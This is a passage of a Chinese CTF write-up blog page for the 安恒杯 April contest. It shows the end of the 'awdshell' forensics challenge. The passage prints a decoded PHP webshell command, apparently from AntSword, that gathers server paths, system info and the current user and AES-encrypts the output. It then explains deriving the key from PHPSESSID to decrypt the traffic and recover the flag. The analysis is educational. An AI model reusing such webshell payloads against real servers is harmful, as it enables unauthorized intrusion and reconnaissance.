OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">	$output&#x3D;ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;f9d3fc090&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;4d608782174&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">	$D&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">	if($D&#x3D;&#x3D;&quot;&quot;)$D&#x3D;dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">	$R&#x3D;&quot;&#123;$D&#125;	&quot;;</span><br><span class="line">	if(substr($D,0,1)!&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">		foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.&#x3D;&quot;&#123;$L&#125;:&quot;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$R.&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	$R.&#x3D;&quot;	&quot;;</span><br><span class="line">	$u&#x3D;(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;</span><br><span class="line">	$s&#x3D;($u)?$u[&quot;name&quot;]:@get_current_user();</span><br><span class="line">	$R.&#x3D;php_uname();</span><br><span class="line">	$R.&#x3D;&quot;	&#123;$s&#125;&quot;;</span><br><span class="line">	echo $R;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">	echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>可以看出返回的密文是一个AES加密后加盐混淆的东西，AES是<code>AES-128-ECB</code>模式，KEY是session的前16位，也就是<code>hm3pq66843bbbrdg</code>可以看报文cookie里的 PHPSESSID获得</p>
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164054689.png" alt></p>
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164254472.png" alt></p>
+<p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164316178.png" alt></p>
+<p>最后一步步解密得到flag</p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="http://www.fzwjscj.xyz/index.php/archives/25/" target="_blank" rel="noopener">http://www.fzwjscj.xyz/index.php/archives/25/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-Ezunserialize"><span class="toc-number">1.1.</span> <span class="toc-text">0x 01 Ezunserialize</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-babytricks"><span class="toc-number">2.</span> <span class="toc-text">0x 02 babytricks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-01-6G还远吗？"><span class="toc-number">3.1.</span> <span class="toc-text">0x 01 6G还远吗？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-02-blueshark"><span class="toc-number">3.2.</span> <span class="toc-text">0x 02 blueshark</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-keyboard"><span class="toc-number">4.</span> <span class="toc-text">0x 03 keyboard</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x-04-awdshell"><span class="toc-number">4.1.</span> <span class="toc-text">0x 04 awdshell</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=安恒杯四月月赛题解" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=安恒杯四月月赛题解" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/&text=安恒杯四月月赛题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=安恒杯四月月赛题解&body=Check out this article: http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
